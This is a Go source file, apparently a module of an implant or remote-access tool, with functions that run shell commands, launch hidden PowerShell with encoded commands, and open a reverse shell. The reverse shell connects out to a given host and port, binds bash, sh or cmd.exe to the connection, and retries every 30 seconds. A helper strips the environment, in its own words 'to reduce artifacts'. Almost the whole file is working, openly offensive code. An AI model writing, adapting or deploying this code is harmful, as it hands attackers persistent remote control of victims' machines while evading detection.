// Package shell provides command execution and reverse shell capabilities.
package shell

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Exec runs a command string through the native shell and returns stdout+stderr.
// Timeout: 60 seconds.
func Exec(cmd string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	var c *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		c = exec.CommandContext(ctx, "cmd.exe", "/C", cmd)
	default:
		c = exec.CommandContext(ctx, "/bin/sh", "-c", cmd)
	}

	var out bytes.Buffer
	var errBuf bytes.Buffer
	c.Stdout = &out
	c.Stderr = &errBuf
	c.Env = os.Environ()

	err := c.Run()
	combined := out.String() + errBuf.String()
	if err != nil {
		return combined, err
	}
	return combined, nil
}

// ExecPowerShell runs a PowerShell command (Windows only, no-op on Linux with log).
func ExecPowerShell(cmd string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("powershell: not on windows")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	c := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", psEncode(cmd),
	)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	err := c.Run()
	return out.String(), err
}

// psEncode encodes a PowerShell command as UTF-16LE base64 for -EncodedCommand.
func psEncode(cmd string) string {
	// UTF-16LE encode
	runes := []rune(cmd)
	b := make([]byte, len(runes)*2)
	for i, r := range runes {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	import_b64 := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	_ = import_b64
	// Standard base64 encode
	var buf bytes.Buffer
	enc := make([]byte, 4)
	for i := 0; i < len(b); i += 3 {
		chunk := b[i:]
		if len(chunk) > 3 {
			chunk = chunk[:3]
		}
		switch len(chunk) {
		case 3:
			enc[0] = base64Char(chunk[0] >> 2)
			enc[1] = base64Char((chunk[0]&0x3)<<4 | chunk[1]>>4)
			enc[2] = base64Char((chunk[1]&0xf)<<2 | chunk[2]>>6)
			enc[3] = base64Char(chunk[2] & 0x3f)
		case 2:
			enc[0] = base64Char(chunk[0] >> 2)
			enc[1] = base64Char((chunk[0]&0x3)<<4 | chunk[1]>>4)
			enc[2] = base64Char((chunk[1] & 0xf) << 2)
			enc[3] = '='
		case 1:
			enc[0] = base64Char(chunk[0] >> 2)
			enc[1] = base64Char((chunk[0] & 0x3) << 4)
			enc[2] = '='
			enc[3] = '='
		}
		buf.Write(enc[:4])
	}
	return buf.String()
}

func base64Char(v byte) byte {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	return chars[v&0x3f]
}

// ReverseShell connects to host:port and spawns an interactive shell.
// Retries every 30s until successful.
func ReverseShell(host string, port int) {
	addr := fmt.Sprintf("%s:%d", host, port)
	for {
		if err := reverseShellOnce(addr); err != nil {
			time.Sleep(30 * time.Second)
		}
	}
}

func reverseShellOnce(addr string) error {
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	var shell string
	var args []string
	switch runtime.GOOS {
	case "windows":
		shell = "cmd.exe"
	default:
		// Prefer bash, fall back to sh
		if _, err := exec.LookPath("bash"); err == nil {
			shell = "bash"
			args = []string{"--norc", "--noprofile", "-i"}
		} else {
			shell = "/bin/sh"
			args = []string{"-i"}
		}
	}

	cmd := exec.Command(shell, args...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Env = cleanEnv()
	return cmd.Run()
}

// cleanEnv returns a minimal environment for the shell to reduce artifacts.
func cleanEnv() []string {
	keep := []string{"HOME", "USER", "PATH", "TERM", "SHELL", "LANG",
		"USERNAME", "USERPROFILE", "SYSTEMROOT", "COMSPEC"}
	env := os.Environ()
	var result []string
	for _, e := range env {
		for _, k := range keep {
			if strings.HasPrefix(e, k+"=") {
				result = append(result, e)
				break
			}
		}
	}
	return result
}
